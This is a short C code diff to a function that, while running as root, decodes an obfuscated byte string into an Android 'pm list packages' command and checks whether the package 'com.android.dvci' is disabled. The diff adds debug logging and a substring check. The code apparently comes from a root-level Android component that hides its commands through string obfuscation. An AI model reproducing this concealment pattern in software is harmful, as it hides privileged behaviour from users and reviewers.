@@ -41,7 +41,8 @@ static int is_pkg_disabled(void) {
   int pid;
 
   unsigned char pm_cmd[] = "\x8b\x4c\xe0\x0b\x7e\xbb\x7f\x62\x08\x07\xbb\x0b\x7a\x78\x60\x7a\x74\x76\x08\xbb\xbe\x77\xbb\xbe\x75\xbb\x78\x7c\x7e\xbd\x7a\x7d\x77\x09\x7c\x62\x77\xbd\x77\x05\x78\x62"; // "pm list packages -d -f com.android.dvci"
-
+  unsigned char pkg[] = "com.android.dvci";
+  LOGD("[is_pkg_disabled] start\n");
   // We need to stay root
   pid = fork();
 
@@ -62,12 +63,17 @@ static int is_pkg_disabled(void) {
 
     fp = popen(deobfuscate(pm_cmd), "r");
 
-    if (fp == NULL) 
-      return 0;
+    if (fp == NULL){ 
+        LOGD("[is_pkg_disabled] deob failed\n");
+        return 0;
+    }
 
     while (fgets(path, 1024, fp) != NULL) {
-      if(strlen(path) > 0) {
-	disabled = 1;
+      if(strlen(path) > 0 ) {
+        LOGD("[is_pkg_disabled] found %s\n",path);
+	if( strstr(path,pkg) != NULL) { 
+          disabled = 1;
+        }
 	break;
       }
     }
